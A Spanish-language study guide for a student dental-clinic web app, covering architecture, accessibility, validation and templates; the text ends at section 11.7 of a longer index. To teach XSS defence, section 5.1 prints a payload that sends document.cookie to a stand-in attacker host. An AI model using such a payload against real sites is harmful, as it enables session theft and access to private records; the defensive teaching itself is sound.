# Documento de sustentación — DentalCare (Frontend A0 a A6, APIs externas, Fase B: base de datos y Fase C: backend)

> Guía de estudio para la sustentación individual. Explica **qué** se construyó, **por qué** se
> tomó cada decisión y **cómo** defenderla ante el docente. Cada concepto apunta al archivo real del
> proyecto para que puedas mostrarlo en vivo.
>
> Para ver todo funcionando: abrir `frontend/index.html` con **Live Server** (VS Code) e ingresar con
> una cuenta de demostración (§12.10). El catálogo de componentes sigue en `frontend/styleguide.html`.
> Para usar el backend real (fase C): §16.8.

---

## Índice

1. [Resumen de lo construido](#1-resumen-de-lo-construido)
2. [Arquitectura: Atomic Design](#2-arquitectura-atomic-design)
3. [¿Por qué JavaScript puro y no un framework?](#3-por-qué-javascript-puro-y-no-un-framework)
4. [Design tokens: el sistema de diseño](#4-design-tokens-el-sistema-de-diseño)
5. [Seguridad: `h()` vs `innerHTML` y el ataque XSS](#5-seguridad-h-vs-innerhtml-y-el-ataque-xss)
6. [Accesibilidad: WAI-ARIA aplicado](#6-accesibilidad-wai-aria-aplicado)
7. [Validación en línea de formularios](#7-validación-en-línea-de-formularios)
8. [Conceptos técnicos clave](#8-conceptos-técnicos-clave)
9. [El odontograma y la numeración FDI](#9-el-odontograma-y-la-numeración-fdi)
10. [Fase A3: organismos y reglas de negocio](#10-fase-a3-organismos-y-reglas-de-negocio)
11. [Fase A4: templates](#11-fase-a4-templates)
12. [Fase A5: capa de servicios, sesión y guards](#12-fase-a5-capa-de-servicios-sesión-y-guards)
13. [Fase A6: pantallas definitivas por rol](#13-fase-a6-pantallas-definitivas-por-rol)
14. [Integración de APIs externas (servicios web de terceros)](#14-integración-de-apis-externas-servicios-web-de-terceros)
15. [Fase B: base de datos v2](#15-fase-b-base-de-datos-v2)
16. [Fase C: backend (Node.js + Express + MySQL)](#16-fase-c-backend-nodejs--express--mysql)
17. [Cómo se verificó la calidad](#17-cómo-se-verificó-la-calidad)
18. [Simulacro de preguntas del docente](#18-simulacro-de-preguntas-del-docente)
19. [Glosario](#19-glosario)

---

## 1. Resumen de lo construido

| Fase | Qué se hizo | Dónde está |
|---|---|---|
| **A0** Setup y design system | Estructura de carpetas, tokens de diseño (colores, tipografía, espaciado), reset CSS, estilos base y el *styleguide* (catálogo vivo de componentes) | `frontend/css/base/`, `frontend/styleguide.html` |
| **A1** Átomos | 13 componentes mínimos: `Button`, `Input`, `Select`, `Textarea`, `Checkbox`, `Radio`, `Switch`, `Badge`/`StatusBadge`, `Avatar`, `Icon`, `Label`, `Spinner`, `Link` | `frontend/js/components/atoms/` |
| **A2** Moléculas | 10 combinaciones de átomos: `FormField`, `PasswordField`, `SearchBar`, `KpiCard`, `Tabs`, `Pagination`, `Toast`, `ConfirmDialog`, `TimeSlot`, `Tooth` | `frontend/js/components/molecules/` |
| **A3** Organismos | Secciones completas: `Topbar`, `Sidebar`, `DataTable`, `ModalForm`, `Odontogram`, `Calendar`, `DashboardCharts`, `BookingWizard` | `frontend/js/components/organisms/` |
| **A4** Templates | Esqueletos de pantalla: `DashboardLayout` (marco con skip-link, sidebar, topbar y migas), `AuthLayout` (login y contraseña), `DetailLayout` (ficha del paciente) + molécula `Breadcrumbs` | `frontend/js/components/templates/` |
| **A5** Servicios y sesión | Capa de servicios (9 servicios con la misma interfaz para mock y API), base de datos simulada en `localStorage`, login con contraseñas PBKDF2, sesión con vencimiento, *guard* de páginas por rol, matriz de permisos y auditoría | `frontend/js/services/`, `frontend/js/core/` (`config`, `storage`, `session`, `guard`, `permissions`) |
| **A6** Pantallas | 25 pantallas HTML: entrada (`index`, `login`, `403`) y las de cada rol, con 14 controladores compartidos que solo consumen la capa de servicios | `frontend/*.html`, `frontend/pages/<rol>/`, `frontend/js/pages/` |
| **APIs externas** | Dos servicios web públicos y reales consumidos con `fetch()`: departamentos y municipios de Colombia (Datos Abiertos, DIVIPOLA) en el registro de pacientes y la TRM del dólar en pagos, con tiempo límite, caché y respaldo sin internet | `frontend/js/services/colombia.service.js`, `trm.service.js`, `externo.js` |
| **B** Base de datos v2 | Corrección de la base antes del backend: contraseñas con bcrypt, matriz de permisos según RN-01, `rol.estado`, ubicación DIVIPOLA, estado de venta calculado, tratamiento en la cita, tokens de recuperación y 14 restricciones `CHECK`. Incluye migración, instalación completa y 38 pruebas SQL | `database/` (`CAMBIOS.md`, `dentalcare_bd_v2.sql`, `migrations.sql`), `tests/db/` |
| **C** Backend | API REST en Node.js + Express 5 + `mysql2/promise` (sin ORM): configuración con `.env`, pool de conexiones, errores centralizados, login con bcrypt y JWT, `verifyToken`/`requirePermission`, listado y registro de pacientes con validación DIVIPOLA. El frontend la usa con `USE_MOCK = false` sin cambiar ninguna página. 79 pruebas de la API y 19 E2E | `backend/`, `tests/backend/`, `tests/e2e/backend.test.mjs` |

**Stack del proyecto:** HTML5 + CSS3 + JavaScript puro (ES Modules) en el frontend; Node.js + Express +
MySQL (mysql2/promise, sin ORM) en el backend. Con `USE_MOCK = true` (valor por defecto) las pantallas
usan **datos mock** copiados del seed, servidos por la capa de servicios de la fase A5. Con
`USE_MOCK = false` usan la API real de la fase C (§16) sobre la base **v2** (§15). Por ahora responden
autenticación y pacientes; los demás módulos llegan en la fase D.

---

## 2. Arquitectura: Atomic Design

### 2.1 La idea

Atomic Design (Brad Frost, 2013) organiza la interfaz como la química: piezas pequeñas que se
combinan en piezas más grandes.

```
  ÁTOMOS          MOLÉCULAS             ORGANISMOS              TEMPLATES          PÁGINAS
  (no se          (átomos que           (secciones con          (estructura        (template +
  dividen)        trabajan juntos)      sentido propio)         de la pantalla)    datos reales)

  Label ─┐
  Input ─┼──────► FormField ─┐
  Icon  ─┘                   ├────────► ModalForm ─────────┐
  Button ───────────────────┘                              ├──► Dashboard ──► admin/dashboard.html
  Badge ──┐                                                │    layout          (con datos de citas)
  Avatar ─┼─────► KpiCard ──────────► Topbar + Sidebar ────┘
  Icon  ──┘
```

| Nivel | Definición | Ejemplo en DentalCare |
|---|---|---|
| **Átomo** | Elemento HTML con estilo; no tiene sentido dividirlo más | `Button`, `Input`, `Badge` |
| **Molécula** | Grupo pequeño de átomos con **una** función | `FormField` = `Label` + `Input` + mensaje de error |
| **Organismo** | Sección completa e independiente de la interfaz | `DataTable` = `SearchBar` + chips + tabla + `Pagination` |
| **Template** | Esqueleto de la pantalla, sin datos (fase A4) | `DashboardLayout` = Topbar + Sidebar + migas + hueco del contenido |
| **Página** | Template con datos concretos (fase A6) | `pages/admin/dashboard.html` |

### 2.2 La regla de oro: las dependencias van en un solo sentido

Un nivel **solo importa de niveles inferiores**. Una molécula puede usar átomos, pero un átomo nunca
importa una molécula. Esto se ve en los `import` de cada archivo:

```js
// js/components/molecules/form-field.js  (molécula → importa átomos)
import { Input, Select, Textarea, Label, Icon, Button } from '../atoms/index.js';

// js/components/organisms/data-table.js  (organismo → importa átomos y moléculas)
import { Icon, Button } from '../atoms/index.js';
import { SearchBar, Pagination } from '../molecules/index.js';

// js/components/templates/dashboard-layout.js  (template → importa los tres niveles inferiores)
import { Spinner } from '../atoms/index.js';
import { Breadcrumbs } from '../molecules/index.js';
import { Topbar, Sidebar } from '../organisms/index.js';
```

**¿Por qué importa?** Evita dependencias circulares y permite cambiar un átomo (por ejemplo, el
color de `Button`) sabiendo que el cambio se propaga a **todo** el sistema de forma consistente.

### 2.3 Cada componente es una función

```js
// Recibe "props" (un objeto de configuración) y devuelve un elemento del DOM.
const boton = Button({ label: 'Guardar', icon: 'check', variant: 'primary', onClick: guardar });
document.body.append(boton);
```

Ventajas: es fácil de probar, de reutilizar y de leer. No hay clases, ni herencia, ni magia: es la
misma idea de los componentes de React, pero sin la librería.

### 2.4 Archivos *barrel* (`index.js`)

Cada nivel tiene un `index.js` que reexporta todo. Así las páginas escriben una sola línea:

```js
import { Button, Input, StatusBadge } from '../components/atoms/index.js';
```

### 2.5 Estructura de carpetas

```
frontend/
├── styleguide.html              ← catálogo vivo (sirve también como prueba visual)
├── css/
│   ├── base/                    tokens.css · reset.css · base.css
│   ├── atoms/ molecules/ organisms/ templates/
│   └── main.css                 importa todo en orden de Atomic Design
└── js/
    ├── core/                    utilidades sin interfaz: dom, validators, format, dates, agenda…
    │                            + (A5) config, storage, session, guard, permissions
    ├── components/atoms|molecules|organisms|templates/
    ├── data/mock/               datos de prueba copiados del SQL
    ├── services/                (A5) capa de servicios: *.service.js, http.js, api-error.js
    │   └── mock/                base de datos simulada (db.js) y hash de contraseñas (password.js)
    └── pages/                   un controlador por página (_shared/app-page.js = arranque común)
tests/                           (raíz del proyecto) pruebas en Node: node tests/<suite>.test.mjs
```

---

## 3. ¿Por qué JavaScript puro y no un framework?

### 3.1 Razones

1. **Requisito del proyecto:** el stack exige HTML, CSS y JS sin frameworks.
2. **Aprendizaje real:** frameworks como React esconden cómo funciona el DOM. Aquí cada concepto
   (crear elementos, eventos, foco, accesibilidad) se programa y se entiende.
3. **Cero dependencias:** no hay `npm install` en el frontend ni CDN. No hay librerías que
   actualizar, ni vulnerabilidades de terceros, ni riesgo de que un CDN caiga.
4. **Rendimiento:** el navegador carga solo nuestro código. No hay un *bundle* de cientos de KB.
5. **Estándares nativos:** usamos lo que el navegador ya trae: `<dialog>`, ES Modules,
   `Intl` (fechas y moneda), `ResizeObserver`, *container queries*.

### 3.2 Lo que cuesta (hay que reconocerlo en la sustentación)

| Un framework daría… | Cómo lo resolvimos sin framework |
|---|---|
| Reactividad automática (la vista se actualiza sola) | Funciones `render()` explícitas que vuelven a dibujar con `mount()` |
| Sintaxis JSX | La función `h(tag, attrs, ...children)` en `js/core/dom.js` |
| Protección XSS por defecto | `h()` usa `createTextNode`: mismo nivel de protección (ver §5) |
| Componentes con estado | *Closures*: el estado vive dentro de la función del componente |

**Frase para la sustentación:** *"No reinventamos un framework: aplicamos los mismos principios
(componentes, props, composición) con las APIs estándar del navegador."*

---

## 4. Design tokens: el sistema de diseño

Un **token** es una variable de diseño con nombre. Están en `css/base/tokens.css`:

```css
:root {
  --color-primary-700: #0f766e;           /* valor crudo de la paleta */
  --color-brand: var(--color-primary-700); /* alias semántico: "el color de la marca" */
  --space-4: 1rem;
  --radius-md: 8px;
}
.btn--primary { background: var(--color-brand); } /* los componentes usan alias */
```

- **Dos capas:** valores crudos (`--color-primary-700`) y alias semánticos (`--color-brand`,
  `--color-border`, `--color-text-muted`). Los componentes **solo** usan alias.
- **Beneficio:** cambiar la identidad del consultorio = editar un archivo. Ningún componente tiene
  colores "quemados".
- **Escala de 4px** para el espaciado: todo queda alineado y proporcionado.
- **Nomenclatura BEM** en las clases: `.bloque__elemento--modificador` → `.btn`, `.btn__label`,
  `.btn--primary`. Evita choques de nombres sin herramientas extra.

---

## 5. Seguridad: `h()` vs `innerHTML` y el ataque XSS

### 5.1 ¿Qué es XSS?

**Cross-Site Scripting**: un atacante logra que el navegador de otra persona ejecute su código.
Ejemplo en DentalCare: un paciente se registra con este "nombre":

```
<img src=x onerror="fetch('https://atacante.com?c='+document.cookie)">
```

Si la recepcionista abre el listado de pacientes y el código hizo esto:

```js
celda.innerHTML = paciente.nombres;   // ❌ PELIGROSO
```

…el navegador **interpreta** el texto como HTML, crea la imagen, falla al cargarla y ejecuta el
`onerror`. El atacante roba la sesión de la recepcionista y, con ella, acceso a historias clínicas.
Eso violaría la **Ley 1581 de 2012** (RNF-PRI-01).

### 5.2 Nuestra defensa: `h()` y `createTextNode`

```js
// js/core/dom.js
export function appendChildren(parent, children) {
  for (const child of children.flat(Infinity)) {
    parent.append(child instanceof Node ? child : document.createTextNode(String(child)));
  }
}
```

`createTextNode` crea un nodo de **texto**: el navegador nunca lo interpreta como HTML. El
`<img…>` malicioso se **muestra** literalmente en pantalla, pero no se ejecuta.

```js
celda.append(h('td', {}, paciente.nombres));  // ✅ SEGURO: siempre es texto
```

**Está probado:** la prueba automatizada de A3 renderiza ese ataque en `DataTable` y comprueba que
no aparece ninguna `<img>` y que el código no se ejecuta.

### 5.3 ¿Dónde sí usamos `innerHTML` y por qué es seguro?

En **un solo lugar**: `js/components/atoms/icon.js`, para insertar los trazos SVG de los íconos.
Es seguro porque esos textos son **constantes escritas por nosotros** en el código, nunca datos
del usuario. La regla no es "nunca usar `innerHTML`", sino **"nunca usar `innerHTML` con datos que
no controlamos"**.

### 5.4 Otras medidas aplicadas

| Medida | Dónde | Por qué |
|---|---|---|
| Error de login genérico ("Correo o contraseña incorrectos") | demo de login, styleguide | RF-ACC-02: no revelar si un correo existe (evita enumerar usuarios) |
| `rel="noopener noreferrer"` en enlaces externos | `atoms/link.js` | La pestaña abierta no puede manipular la nuestra (*tabnabbing*) |
| Textos de gráficas con `textContent` | `organisms/charts.js` | Los nombres de tratamientos vienen de la BD |
| Validación en el cliente **no** reemplaza la del servidor | backend (fase C) | El cliente se puede saltar con las DevTools; el servidor tiene la última palabra |

---

## 6. Accesibilidad: WAI-ARIA aplicado

### 6.1 Conceptos base

- **Accesibilidad (a11y):** que cualquier persona pueda usar el sistema, incluidas personas que
  usan lector de pantalla, solo teclado o tienen baja visión.
- **WAI-ARIA:** atributos `role` y `aria-*` que le explican a las tecnologías de asistencia qué es
  y en qué estado está cada elemento.
- **Primera regla de ARIA:** *si existe un elemento HTML nativo que hace lo que necesitas, úsalo.*
  Por eso usamos `<button>`, `<dialog>`, `<label>` y `<input type="checkbox">` reales, en lugar de
  `<div>` con ARIA.

### 6.2 Atributos ARIA usados y para qué

| Atributo | Qué comunica | Dónde |
|---|---|---|
| `aria-invalid="true"` | "Este campo tiene un error" | `FormField` (y el borde rojo sale de este atributo en el CSS) |
| `aria-describedby` | Enlaza el campo con su ayuda y su error: el lector los lee al enfocar | `FormField` |
| `aria-live="polite"` | Anuncia cambios de texto sin mover el foco | errores, contador de resultados, toasts |
| `role="alert"` | Anuncia de inmediato (mensajes urgentes) | toast de error, errores de modales |
| `aria-pressed` | Botón de dos estados (activado o no) | mostrar contraseña, `TimeSlot`, chips de filtro |
| `aria-expanded` + `aria-controls` | "Este botón abre o cierra aquel panel" | notificaciones, perfil, menú móvil |
| `aria-current="page"` / `"step"` | El ítem actual de una navegación o un proceso | `Sidebar`, `Pagination`, `BookingWizard` |
| `aria-sort` | Columna ordenada y en qué dirección | `DataTable` |
| `aria-selected` + `role="tab"` | Pestaña activa | `Tabs` |
| `aria-disabled` (vs `disabled`) | No disponible, pero sigue siendo enfocable | `TimeSlot` ocupado: el usuario de teclado puede llegar y escuchar "Ocupado" |
| `aria-hidden="true"` | Oculta lo decorativo (íconos) al lector | todos los íconos sin significado propio |

### 6.3 Patrones de interacción implementados

- **Tabs (pestañas):** *roving tabindex*. Solo la pestaña activa tiene `tabindex="0"`; las flechas
  ← → se mueven entre pestañas e Inicio/Fin van a los extremos. Así la tecla Tab no obliga a pasar
  por cada pestaña. (`molecules/tabs.js`)
- **Pieza dental:** el mismo patrón. Cinco caras, pero una sola parada de Tab por diente; las
  flechas recorren las caras. Si no fuera así, el odontograma tendría 160 paradas de Tab.
- **Disclosure (menús desplegables):** botón con `aria-expanded`; Escape cierra **y devuelve el
  foco** al botón; un clic afuera también cierra. (`core/popover.js`)
- **Diálogo modal:** `<dialog>` nativo con `showModal()`. Trae gratis el foco atrapado dentro del
  modal, Escape para cerrar y el resto de la página inerte. En acciones destructivas el foco
  inicial va a **"Cancelar"** (la opción segura).
- **Sidebar móvil:** al abrir, el foco va al primer enlace; Escape o el fondo cierran; el foco
  vuelve al botón de menú.

### 6.4 Decisiones de "no usar" un rol ARIA (también se defienden)

- **No usamos `role="menu"`** en el menú de perfil: ese rol obliga a implementar todo el teclado de
  menús de aplicación de escritorio. Para enlaces de navegación, WAI-ARIA recomienda *disclosure*.
- **No usamos `role="grid"`** en el calendario mensual: obliga a navegar con flechas entre celdas.
  Cada día es un `<button>` con nombre completo ("Lunes, 20 de octubre de 2026: 5 citas").
- *Un ARIA mal usado es peor que ningún ARIA*: le promete al usuario un comportamiento que no existe.

### 6.5 Otros detalles

- `:focus-visible`: el anillo de foco aparece al navegar con teclado, no al hacer clic.
- `prefers-reduced-motion`: las animaciones se desactivan si el usuario lo pidió en su sistema.
- Etiquetas visualmente ocultas (`.u-visually-hidden`): texto para el lector que no ocupa espacio.
- Asterisco de obligatorio con `aria-hidden` + texto oculto "(obligatorio)": el lector no dice
  "asterisco".

---

## 7. Validación en línea de formularios

**Requisito (SRS 3.1):** *"Todo formulario valida en línea con mensaje de error junto al campo."*

### 7.1 Validadores como funciones (`js/core/validators.js`)

Cada validador es una **fábrica**: devuelve una función que recibe el valor y responde `null`
(válido) o un **mensaje de error**.

```js
validators.documento()   // (valor) => /^\d{6,12}$/.test(valor) ? null : 'Solo números, entre 6 y 12 dígitos.'
validators.telefono()    // celular colombiano: 10 dígitos que inician en 3
validators.password()    // 8+ caracteres con mayúscula, minúscula, número y símbolo
validators.matches(() => otraClave.value)  // confirmar contraseña
validators.dateNotPast() // no se agendan citas en el pasado
```

`compose(...)` combina varios y devuelve **el primer** error encontrado.

### 7.2 El flujo de `FormField`

1. El usuario escribe y **sale del campo** (`blur`) → se valida.
   *No* se valida en cada tecla al principio: sería molesto que diga "correo inválido" cuando
   apenas escribiste "a".
2. Si quedó inválido, ahora **sí** se revalida mientras escribe, para quitar el error en cuanto
   se corrige (retroalimentación positiva inmediata).
3. Al enviar, `validateForm(form)` valida todo y **lleva el foco al primer campo con error**.
4. Los formularios tienen `novalidate` para desactivar los globos nativos del navegador, que no se
   pueden estilizar ni traducir de forma consistente.

### 7.3 Errores del servidor

`ModalForm` acepta un `FieldError('numero_documento', 'Ya existe un paciente con este documento.')`
y lo pinta **junto al campo correcto**, no en una alerta genérica.

---

## 8. Conceptos técnicos clave

### 8.1 Debounce (`molecules/search-bar.js`)

**Problema:** si se filtra en cada tecla, escribir "Galvis" dispara 6 búsquedas. Con el backend
serían 6 consultas a MySQL.

**Solución:** esperar a que el usuario **deje de escribir** 300 ms.

```
Teclas:     G    a    l    v    i    s                      (pausa)
Timer:      ×    ×    ×    ×    ×    ⏱──── 300 ms ────► búsqueda("Galvis")   ← 1 sola búsqueda
```

```js
input.addEventListener('input', () => {
  clearTimeout(timer);                // cancela la búsqueda pendiente
  timer = setTimeout(emit, debounce); // programa una nueva
});
```

Además: Enter busca de inmediato y Escape limpia. Si el texto no cambió, no se repite la búsqueda.

### 8.2 Promesas en los diálogos (`molecules/confirm-dialog.js`)

`confirmDialog()` devuelve una **Promise** que se resuelve cuando el usuario decide:

```js
const confirmado = await confirmDialog({ title: '¿Cancelar la cita?', variant: 'danger' });
if (confirmado) cancelarCita();
```

**¿Por qué una promesa?** El código queda lineal y legible, como el `confirm()` nativo, pero sin
bloquear el navegador y con un diseño propio y accesible.

**Detalle de robustez:** la función `finish()` es **idempotente** (si se llama dos veces, la
segunda no hace nada). Un diálogo puede cerrarse por botón, por Escape o por clic afuera, y la
promesa debe resolverse **exactamente una vez**.

**Acción asíncrona:** con `onConfirm`, el botón muestra "cargando", Escape se bloquea mientras se
procesa, y si el servidor falla el error aparece **dentro** del modal sin cerrarlo.

### 8.3 Reflow vs `requestAnimationFrame` (`molecules/toast.js`)

Para que un toast "entre" con animación, primero debe existir en su estado inicial (invisible) y
**después** recibir la clase `is-visible`. Si ambas cosas pasan en el mismo instante, el navegador
no ve el cambio y no anima.

- **Opción 1, `requestAnimationFrame`:** "agrega la clase en el próximo cuadro".
  **Problema encontrado en las pruebas:** el navegador **pausa** `rAF` en pestañas en segundo plano
  e iframes ocultos → el toast quedaba **invisible**.
- **Opción 2, forzar un reflow (la elegida):**
  ```js
  void element.offsetHeight;          // obliga al navegador a calcular el layout YA
  element.classList.add('is-visible'); // ahora sí hay un "antes" y un "después"
  ```
  Leer `offsetHeight` obliga al navegador a aplicar los estilos pendientes. Es síncrono y no
  depende de que la pestaña esté visible.

**Lección para la sustentación:** se eligió la solución determinista porque las pruebas
automatizadas revelaron el problema.

### 8.4 Evento `close` asíncrono del `<dialog>`

El navegador despacha el evento `close` **después** (en otra vuelta del *event loop*). En las pruebas
se vio que podía tardar, y mientras tanto el modal dejaba la página inerte. Solución: al cerrar con
un botón se finaliza de inmediato; el evento `close` queda solo para Escape.

### 8.5 Fechas sin desfase de zona horaria (`core/format.js → toDate`)

`new Date('2026-09-01')` se interpreta como **medianoche UTC**, que en Colombia (UTC−5) es el
**31 de agosto a las 7 p. m.** Por eso se creó `toDate()`, que interpreta "YYYY-MM-DD" (el formato
de MySQL) en **hora local**.

### 8.6 `Intl`: formatos colombianos sin librerías

```js
new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', maximumFractionDigits: 0 }).format(1500000)
// → "$ 1.500.000"
```

---

## 9. El odontograma y la numeración FDI

### 9.1 Sistema FDI (Federación Dental Internacional)

Cada diente tiene dos dígitos: **cuadrante + posición**.

```
                Derecha del paciente │ Izquierda del paciente
  Superior:   18 17 16 15 14 13 12 11 │ 21 22 23 24 25 26 27 28
  Inferior:   48 47 46 45 44 43 42 41 │ 31 32 33 34 35 36 37 38

  Temporales (niños): cuadrantes 5, 6, 7 y 8, posiciones 1 a 5 (51…85).
```

Ejemplo: **16** = cuadrante 1 (superior derecho), posición 6 = **primer molar superior derecho**.

### 9.2 Las 5 caras (`molecules/tooth.js`)

| Cara | Significado | Posición en el gráfico |
|---|---|---|
| Vestibular | hacia labios o mejillas | arriba en los superiores, abajo en los inferiores |
| Palatina / Lingual | hacia el paladar / la lengua | la opuesta a vestibular |
| Mesial | hacia la línea media | el lado más cercano al centro |
| Distal | lejos de la línea media | el lado exterior |
| Oclusal / Incisal | superficie de masticación / borde de corte | centro (oclusal en muelas, incisal en dientes anteriores) |

El componente **calcula** la posición de cada cara a partir del número FDI. Como el seed de la BD
guarda "LINGUAL" incluso en dientes superiores, `normalizeFace()` corrige el nombre según el diente.

**Colores (convención clínica):** rojo = patología por tratar, azul = tratamiento realizado.

---

## 10. Fase A3: organismos y reglas de negocio

| Organismo | Requisito | Lo más importante para explicar |
|---|---|---|
| `Topbar` | SRS 3.1 | Fecha en es-CO, notificaciones con contador accesible, menú de perfil (disclosure) |
| `Sidebar` | SRS 3.1 | El menú se construye desde `core/navigation.js` según el **rol**; panel deslizable en móvil |
| `DataTable` | RNF-USA-02 | Búsqueda sin tildes, filtros por estado con conteos, `aria-sort`, celdas seguras, paginación |
| `ModalForm` | RF-CIT-02 | `await openModalForm()`; errores del servidor junto al campo; no se cierra con un clic afuera (evita perder lo digitado) |
| `Odontogram` | RF-PAC-04, HU-04, RN-01 | 32 o 20 piezas, vista mixta, panel de registro de hallazgos, modo solo lectura |
| `Calendar` | RF-CIT-07 | Día / Semana / Mes / Lista con selector de odontólogo |
| `DashboardCharts` | RF-DAS-01/03 | SVG puro, barras ≤ 24 px, tooltip con teclado, **vista de tabla** alternativa |
| `BookingWizard` | HU-05, RN-02, RF-CIT-03 | 4 pasos, alta rápida de paciente, franjas válidas, **alternativas** si no hay cupo |

### 10.1 RN-02 en código (`core/agenda.js`)

> *"Una cita no puede agendarse si el odontólogo no tiene horario configurado en ese rango."*

`getDaySlots()` cruza la tabla `horario` (día y rango) con las citas existentes y marca cada franja
de 30 minutos como `available`, `occupied`, `blocked` (fuera del horario) o `past` (hora pasada).
El wizard **solo** permite elegir las `available` y **revalida justo antes de guardar** (otra
recepcionista pudo tomar la franja mientras tanto).

### 10.2 RF-CIT-03: alternativas

Si el odontólogo no atiende ese día o no tiene cupos, `suggestAlternatives()` propone:
- las **próximas 3 fechas** con el mismo odontólogo, y
- **otros odontólogos** con cupo ese mismo día.

### 10.3 Decisiones técnicas de A3

- **Container queries** en el odontograma: el componente se adapta a **su propio ancho**, no al de
  la ventana. Así funciona igual en una página completa, en un modal o en una columna.
- **Gráficas redibujadas con `ResizeObserver`** en lugar de escalar un `viewBox`: el texto siempre
  se ve nítido y del tamaño correcto.
- **Color de las gráficas validado**: el teal 700 se veía grisáceo (croma bajo); se eligió
  primary-600 (#0D9488), que pasa las pruebas de contraste (≥ 3:1) y saturación.
- **Datos mock deterministas:** las citas se generan con un generador pseudoaleatorio con semilla
  (*mulberry32*): los datos son iguales en cada recarga, respetan los horarios y no tienen choques
  (verificado con pruebas).

---

## 11. Fase A4: templates

Un **template** es el esqueleto de una pantalla: decide **dónde** va cada organismo, pero no sabe
**qué datos** se muestran. Deja huecos (*slots*) que la página (fase A6) llena con datos reales.

| Pieza | Nivel | Requisito | Dónde está |
|---|---|---|---|
| `DashboardLayout` | Template | SRS 3.1 (sidebar por rol, topbar) | `js/components/templates/dashboard-layout.js` |
| `AuthLayout` | Template | HU-01, HU-02, RF-ACC-01/02 | `js/components/templates/auth-layout.js` |
| `DetailLayout` | Template | RF-PAC-02/03/04, HU-04 | `js/components/templates/detail-layout.js` |
| `Breadcrumbs` | Molécula nueva (la necesitaba el template) | Navegación | `js/components/molecules/breadcrumbs.js` |
| Estilos | — | — | `css/templates/` (`app-shell.css`, `auth-layout.css`, `detail-layout.css`) |

### 11.1 Organismo vs. template vs. página

- **Organismo:** una sección con sentido propio (`Sidebar`, `DataTable`). Se puede usar en
  cualquier pantalla.
- **Template:** la **distribución** de la pantalla. `DashboardLayout` dice: "sidebar a la
  izquierda, topbar arriba, migas, título y contenido".
- **Página:** template + datos. `pages/admin/pacientes.html` usará `DashboardLayout`, le pondrá
  el título "Pacientes" y meterá un `DataTable` con los pacientes.

```js
// Así se verá una página en la fase A6: la página solo llena los huecos del template.
const layout = DashboardLayout({
  role: sesion.rol, user: sesion.usuario, activeId: 'pacientes',
  title: 'Pacientes',
  breadcrumbs: [{ label: 'Inicio', href: appUrl(ROLES[sesion.rol].home) }, { label: 'Pacientes' }],
  actions: [Button({ label: 'Nuevo paciente', icon: 'plus', onClick: nuevo })],
});
document.body.append(layout);
layout.setLoading(true, 'Cargando pacientes…');
layout.setContent(DataTable({ ... }));
```

### 11.2 DashboardLayout: el marco de las pantallas internas

```
┌──────────┬───────────────────────────────────────┐
│          │ Topbar                                │  <header>  (landmark "banner")
│ Sidebar  ├───────────────────────────────────────┤
│ (por     │ Inicio › Pacientes                    │  <nav aria-label="Ruta de navegación">
│  rol)    │ Pacientes ................ [+ Nuevo]  │  <h1> + acciones
│ <nav>    │ [ contenido de la página ]            │  <main id="contenido-principal">
└──────────┴───────────────────────────────────────┘
```

Métodos que expone el template (las páginas no tocan su HTML interno):

| Método | Para qué |
|---|---|
| `update({ title, subtitle, breadcrumbs, actions })` | Cambia **solo** las partes indicadas del encabezado |
| `setContent(...nodos)` | Reemplaza el contenido (slot principal) |
| `setLoading(true, 'Cargando…')` | Muestra un spinner y marca `<main aria-busy="true">` |
| `focusMain()` | Mueve el foco al contenido (útil tras una acción) |
| `.main`, `.topbar`, `.sidebar` | Acceso a los organismos (p. ej. `layout.sidebar.setActive('citas')`) |

### 11.3 El *skip link* (WCAG 2.4.1 "Evitar bloques")

Un usuario de teclado tendría que pulsar <kbd>Tab</kbd> unas 15 veces (todo el menú lateral)
antes de llegar al contenido **en cada página**. El *skip link* es el **primer** elemento
tabulable: un enlace "Saltar al contenido principal" que lleva al `<main>`.

- **No se oculta con `display: none`**: eso lo sacaría del orden de tabulación y no serviría.
  Se mueve fuera de la vista con `transform` y aparece cuando recibe foco (`.skip-link:focus`).
- El `<main>` tiene `tabindex="-1"`: puede recibir foco **por programa** (el enlace), pero no
  entra en el orden normal de <kbd>Tab</kbd>.
- `scroll-margin-top: var(--layout-topbar-h)`: al saltar, el inicio del contenido no queda
  escondido debajo de la topbar fija.

### 11.4 Un solo `<h1>` y el título de la pestaña

- Cada pantalla tiene **un** `<h1>`: los lectores de pantalla lo usan para saber "dónde estoy" y
  navegar por encabezados (WCAG 1.3.1).
- `update({ title })` también cambia el `<title>` del documento ("Pacientes · DentalCare"), que es
  lo primero que anuncia el lector al cargar la página (WCAG 2.4.2 "Página titulada").
- En la ficha del paciente el `<h1>` es **el nombre del paciente** (lo pone `DetailLayout`), así
  que el marco se usa sin `title` y su encabezado queda oculto (`hidden`: no se ve ni se lee).

### 11.5 Breadcrumbs (patrón WAI-ARIA "Breadcrumb")

```html
<nav aria-label="Ruta de navegación">
  <ol>
    <li><a href="…/dashboard.html">Inicio</a></li>
    <li><svg aria-hidden="true">›</svg><a href="…/pacientes.html">Pacientes</a></li>
    <li><svg aria-hidden="true">›</svg><span aria-current="page">Andrés Galvis</span></li>
  </ol>
</nav>
```

- `<nav>` con nombre propio: hay dos navegaciones en la página (menú y migas) y el lector las
  distingue por su `aria-label`.
- `<ol>` (lista **ordenada**) porque el orden importa: es una jerarquía.
- El último elemento es la página actual: **no es enlace** (no tiene sentido enlazar a donde ya
  estás) y lleva `aria-current="page"`.
- Los separadores `›` son decorativos: `aria-hidden="true"` evita que el lector los lea.

### 11.6 `setLoading` y la condición de carrera

Cuando los datos lleguen de la API (fase D), cargar tomará tiempo. Si el usuario hace clic en
"Citas" y, antes de que termine, en "Pagos", la respuesta de "Citas" puede llegar **después** y
pintar la página equivocada. A eso se le llama **condición de carrera**. La solución es un
contador ("token") de navegación: solo se pinta la respuesta de la **última** petición.

```js
let navToken = 0;
async function irA(item) {
  const token = ++navToken;               // esta navegación es la #n
  layout.setLoading(true, `Cargando ${item.label}…`);
  const datos = await servicio.listar();  // tarda…
  if (token !== navToken) return;         // el usuario ya navegó a otra parte: descartar
  layout.setContent(render(datos));
}
```

Mientras carga, `<main aria-busy="true">` le dice al lector de pantalla que el contenido está
cambiando, y el `Spinner` tiene `role="status"` con el texto "Cargando pacientes…".

### 11.7 AuthLayout: vistas y manejo del foco

- Un solo template para **iniciar sesión**, **recuperar** y **restablecer** contraseña.
  `setView({ title, subtitle, content, footer })` cambia de vista **sin recargar**.
